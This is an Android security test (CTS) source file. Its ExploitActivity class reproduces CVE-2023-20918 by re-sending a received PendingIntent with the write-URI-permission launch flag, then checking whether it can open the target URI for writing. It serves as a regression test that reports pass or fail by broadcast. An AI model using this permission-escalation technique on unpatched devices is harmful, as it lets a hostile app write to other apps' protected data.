/*
 * Copyright (C) 2022 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package android.security.cts.CVE_2023_20918_attacker;

import android.app.Activity;
import android.app.ActivityOptions;
import android.app.PendingIntent;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class ExploitActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        try {
            super.onCreate(savedInstanceState);
            Intent intent = getIntent();
            final String keyPendingIntent = getString(R.string.keyPendingIntent);

            // If intent contains 'keyPendingIntent', then this activity is launched again using
            // the custom intent that the extra 'keyPendingIntent' holds.
            if (intent.hasExtra(keyPendingIntent)) {
                PendingIntent activity = intent.getParcelableExtra(keyPendingIntent);
                ActivityOptions options = ActivityOptions.makeBasic();
                options.setPendingIntentLaunchFlags(Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
                activity.send(this, 0, null, null, null, "", options.toBundle());
            } else if (intent.getData() != null) {
                // Control goes in this block when the activity is launched again. Attempting to
                // open uri data received from the intent.
                Uri data = intent.getData();
                getContentResolver().openOutputStream(data);

                // If control reaches here, then it means that openOutputStream() did not raise an
                // exception, this indicates that FLAG_GRANT_WRITE_URI_PERMISSION has been granted
                // so sending a broadcast to DeviceTest with the test_fail status.
                sendBroadcastToTestApp(getString(R.string.bcastActionTestFail));
            }
        } catch (Exception e) {
            if (e instanceof SecurityException
                    && e.getMessage().contains(getString(R.string.keyPendingIntent))) {
                // ignoring this exception since it occurs with fix
                sendBroadcastToTestApp(getString(R.string.bcastActionTestPass));
                return;
            }

            // Sending a broadcast to DeviceTest to indicate assumption failure status,
            // since an exception was raised unrelated to the vulnerability
            sendBroadcastToTestApp(getString(R.string.bcastActionTestAssumeFail),
                    getString(R.string.expActivityExploit, e.getMessage()));
        }
    }

    public void sendBroadcastToTestApp(String action) {
        sendBroadcastToTestApp(action, null);
    }

    public void sendBroadcastToTestApp(String action, String assumeFailMsg) {
        try {
            Intent intent = new Intent(action);
            if (assumeFailMsg != null) {
                intent.putExtra(getString(R.string.keyMsgAssumeFail), assumeFailMsg);
            }
            sendBroadcast(intent);
        } catch (Exception ignored) {
            // ignore the exceptions
        }
    }
}
